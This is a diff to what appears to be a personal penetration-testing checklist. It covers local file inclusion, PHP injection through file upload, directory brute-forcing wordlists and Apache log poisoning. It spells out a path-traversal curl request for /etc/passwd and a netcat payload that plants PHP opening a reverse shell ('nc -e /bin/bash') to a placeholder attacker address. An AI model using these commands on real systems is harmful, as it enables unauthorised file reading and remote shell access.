@@ -169,11 +169,18 @@
 	- hostname/username/re-use etc
 - LFI
     - Find vulnerability
-    	- `curl http://$IP:$PORT?arg=../../../../../etc/passwd`
+    	- e.g `curl http://$IP:$PORT?arg=../../../../../etc/passwd`
+    - Upload file
+	- e.g: Upload image & inject php code.
+		- Upload location (gobuster)
+			- wordlist?
+				- rockyou.txt -> username & password
+				- /usr/share/dirb/wordlists/common.txt -> start with simple/bigger
     - Log Posining
+	- <is it readable?>
 		- Attemp to poision log
-          - `echo "GET <?php echo 'TEST123' ?> HTTP/1.1" | nc $IP $PORT`
-		  - `echo "GET <?php system('nc -e /bin/bash $ATTACKER_IP $ATTACKER_PORT'); ?> HTTP/1.1" | nc $VICTIM_IP $VICTIM_PORT`
+        	- `echo "GET <?php echo 'TEST123' ?> HTTP/1.1" | nc $IP $PORT`
+		- `echo "GET <?php system('nc -e /bin/bash $ATTACKER_IP $ATTACKER_PORT'); ?> HTTP/1.1" | nc $VICTIM_IP $VICTIM_PORT`
         - Trigger to check if posioning was successful
           - `curl http://$IP:$PORT?book=../../../../../var/log/apache2/access.log`
           - This would initiate above create reverse shell.
